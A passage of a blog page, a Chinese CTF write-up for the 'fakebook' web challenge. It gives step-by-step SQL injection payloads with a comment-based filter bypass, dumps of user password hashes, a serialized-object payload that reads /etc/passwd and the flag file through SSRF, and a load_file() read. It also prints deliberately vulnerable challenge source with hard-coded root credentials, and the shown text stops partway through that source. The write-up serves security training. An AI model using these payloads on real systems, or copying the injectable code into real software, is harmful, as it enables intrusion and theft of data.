@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-material.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ryaninf.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="背景本题来源于2018年网鼎杯，攻防世界WEB进阶019上是原题。题目考察的是SQL注入中的UNION注入、SSRF和反序列化的组合利用，是一道比较综合性的题目，值得学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fakebook-writeup">
+<meta property="og:url" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/index.html">
+<meta property="og:site_name" content="r0yanx&#39;s Blog">
+<meta property="og:description" content="背景本题来源于2018年网鼎杯，攻防世界WEB进阶019上是原题。题目考察的是SQL注入中的UNION注入、SSRF和反序列化的组合利用，是一道比较综合性的题目，值得学习。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117161419002.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117161700710.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117161737441.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117162320725.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117162029502.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117162619206.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117162818925.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117163048623.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117163314771.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117163519847.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117163823008.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117164906117.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117170538935.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117170930461.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117171213101.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117111540613.png">
+<meta property="og:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117111510196.png">
+<meta property="article:published_time" content="2020-11-17T09:13:42.000Z">
+<meta property="article:modified_time" content="2020-11-17T09:20:18.954Z">
+<meta property="article:author" content="r0yanx">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="SQLi">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="攻防世界">
+<meta property="article:tag" content="反序列">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ryaninf.github.io/2020/11/17/fakebook-writeup/image-20201117161419002.png">
+
+<link rel="canonical" href="https://ryaninf.github.io/2020/11/17/fakebook-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>fakebook-writeup | r0yanx's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">r0yanx's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">信息安全点点滴滴</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/ryaninf" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2020/11/17/fakebook-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          fakebook-writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-17 17:13:42 / 修改时间：17:20:18" itemprop="dateCreated datePublished" datetime="2020-11-17T17:13:42+08:00">2020-11-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>本题来源于2018年网鼎杯，攻防世界WEB进阶019上是原题。题目考察的是SQL注入中的UNION注入、SSRF和反序列化的组合利用，是一道比较综合性的题目，值得学习。</p>
+<a id="more"></a>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>打开题目链接，注册用户</p>
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117161419002.png"></p>
+<p>可以测试发现<code>view.php</code>可能存在SQL注入：</p>
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117161700710.png"></p>
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117161737441.png"></p>
+<p>使用<code>order by</code>测试，枚举到此注入点有5列数据，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 order by 5</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117162320725.png"></p>
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117162029502.png"></p>
+<p>使用<code>UNION SELECT</code>测试注入点，发现<code>UNION SELECT</code>会被拦截，使用注释符绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;1 union select 1,2,3,4</span><br><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117162619206.png"></p>
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117162818925.png"></p>
+<p>可以看到第二列输出到了页面，先获取当前用户名试试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,user(),3,4</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117163048623.png"></p>
+<p>查询所有数据库名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,(select group_concat(SCHEMA_NAME) from information_schema.schemata)a,3,4</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117163314771.png"></p>
+<p>查询fakebook的所有表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,(select group_concat(TABLE_NAME)from information_schema.TABLES WHERE TABLE_SCHEMA&#x3D;&#39;fakebook&#39;)a,3,4</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117163519847.png"></p>
+<p>查询fakebook的users表所有列名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;&#39;fakebook&#39; and TABLE_NAME&#x3D;&#39;users&#39;)a,3,4</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117163823008.png"></p>
+<p>查询fakebook的users表的数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,(select group_concat(no,&#39;&#x3D;&#39;,username,&#39;&#x3D;&#39;,passwd,&#39;&#x3D;&#39;,data) from users)a,3,4</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117164906117.png"></p>
+<p>观察<code>data</code>列及页面报错，推测存在反序列化漏洞，直接修改序列化的字符串中的url和长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;222&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:18:&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117170538935.png"></p>
+<p>枚举几个常见flag文件路径，最终得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;222&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117170930461.png"></p>
+<p>小插曲，读取<code>index.php</code>中也有一个flag字符串，一度认为这是最终flag，却提示错误，此处想暴打出题人！</p>
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117171213101.png"></p>
+<h3 id="非预期解法"><a href="#非预期解法" class="headerlink" title="非预期解法"></a>非预期解法</h3><p>mysql中有一个load_file()函数,这个函数可以读取本地文件,但是有两个条件:</p>
+<ul>
+<li>用户有很高的权限</li>
+<li>知道文件的绝对路径</li>
+</ul>
+<p>本题中数据库恰好使用了root用户：</p>
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117111540613.png"></p>
+<p>那么可以通过<code>load_file</code>读取文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F;select 1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),3,4</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2020/11/17/fakebook-writeup/image-20201117111510196.png"></p>
+<h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line">&lt;?php require_once &#39;db.php&#39;; ?&gt;</span><br><span class="line">&lt;?php require_once &#39;user.php&#39;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; &quot;FLAG&#123;flag is in your mind&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$db &#x3D; new DB();</span><br><span class="line">$user &#x3D; new UserInfo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;ko&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot;</span><br><span class="line">          content&#x3D;&quot;width&#x3D;device-width, user-scalable&#x3D;no, initial-scale&#x3D;1.0, maximum-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Fakebook&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php include &#39;bootstrap.php&#39;; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;h1&gt;the Fakebook&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    if (!isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">        $message &#x3D; &quot;&lt;div class&#x3D;&#39;row&#39;&gt;&quot;;</span><br><span class="line">        $message .&#x3D; &quot;&lt;div class&#x3D;&#39;col-md-2&#39;&gt;&lt;a href&#x3D;&#39;login.php&#39; class&#x3D;&#39;btn btn-success&#39;&gt;login&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line">        $message .&#x3D; &quot;&lt;div class&#x3D;&#39;col-md-2&#39;&gt;&lt;a href&#x3D;&#39;join.php&#39; class&#x3D;&#39;btn btn-info&#39;&gt;join&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line">        $message .&#x3D; &quot;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        echo $message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;p&gt;Share your stories with friends, family and friends from all over the world on &lt;code&gt;Fakebook&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;table class&#x3D;&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;#&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;username&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;age&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;th&gt;blog&lt;&#x2F;th&gt;</span><br><span class="line">        &lt;&#x2F;tr&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line"></span><br><span class="line">        foreach ($db-&gt;getAllUsers() as $user)</span><br><span class="line">        &#123;</span><br><span class="line">            $data &#x3D; unserialize($user[&#39;data&#39;]);</span><br><span class="line"></span><br><span class="line">            echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&#123;$user[&#39;no&#39;]&#125;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&lt;a href&#x3D;&#39;view.php?no&#x3D;&#123;$user[&#39;no&#39;]&#125;&#39;&gt;&#123;$user[&#39;username&#39;]&#125;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&#123;$data-&gt;age&#125;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&#123;$data-&gt;blog&#125;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;&#x2F;tr&gt;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;table&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="db-php"><a href="#db-php" class="headerlink" title="db.php"></a>db.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &#39;lib.php&#39;;</span><br><span class="line">$mysqli &#x3D; new mysqli(&#39;127.0.0.1&#39;, &#39;root&#39;, &#39;naiwjebfahjebfja&#39;, &#39;fakebook&#39;);</span><br><span class="line"></span><br><span class="line">class DB &#123;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        &#x2F;&#x2F; $mysqli &#x3D; new mysqli(&#39;localhost&#39;, &#39;root&#39;, &#39;!@#1234!@#&#39;, &#39;fakebook&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidUsername($username) &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line">        $query &#x3D; &quot;select * from users where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;</span><br><span class="line">        $res &#x3D; $mysqli-&gt;query($query);</span><br><span class="line">        if (!$res-&gt;fetch_array()) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function login($username, $passwd) &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line"></span><br><span class="line">        $username &#x3D; addslashes($username);</span><br><span class="line">        $passwd &#x3D; sha512($passwd);</span><br><span class="line">        $query &#x3D; &quot;select * from users where username &#x3D; &#39;&#123;$username&#125;&#39; and passwd &#x3D; &#39;&#123;$passwd&#125;&#39;&quot;;</span><br><span class="line">        $res &#x3D; $mysqli-&gt;query($query);</span><br><span class="line"></span><br><span class="line">        return $res-&gt;fetch_array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function insertUser($username, $passwd, $data) &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line"></span><br><span class="line">        $username &#x3D; substr($username, 0, 100);</span><br><span class="line">        $username &#x3D; addslashes($username);</span><br><span class="line">        $passwd &#x3D; sha512($passwd);</span><br><span class="line">        $data &#x3D; serialize($data);</span><br><span class="line">        $data &#x3D; addslashes($data);</span><br><span class="line"></span><br><span class="line">        $query &#x3D; &quot;insert into users (username, passwd, data) values (&#39;&#123;$username&#125;&#39;, &#39;&#123;$passwd&#125;&#39;, &#39;&#123;$data&#125;&#39;)&quot;;</span><br><span class="line">        return $mysqli-&gt;real_query($query);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getAllUsers() &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line"></span><br><span class="line">        $query &#x3D; &quot;select * from users&quot;;</span><br><span class="line">        $res &#x3D; $mysqli-&gt;query($query);</span><br><span class="line">        return $res-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getUserByNo($no) &#123;</span><br><span class="line">        global $mysqli;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; $no &#x3D; addslashes($no);</span><br><span class="line">        $query &#x3D; &quot;select * from users where no &#x3D; &#123;$no&#125;&quot;;</span><br><span class="line">        $res &#x3D; $mysqli-&gt;query($query);</span><br><span class="line">        if (!$res) &#123;</span><br><span class="line">            echo &quot;&lt;p&gt;[*] query error! (&#123;$mysqli-&gt;error&#125;)&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $res-&gt;fetch_assoc();</span><br><span class="line">  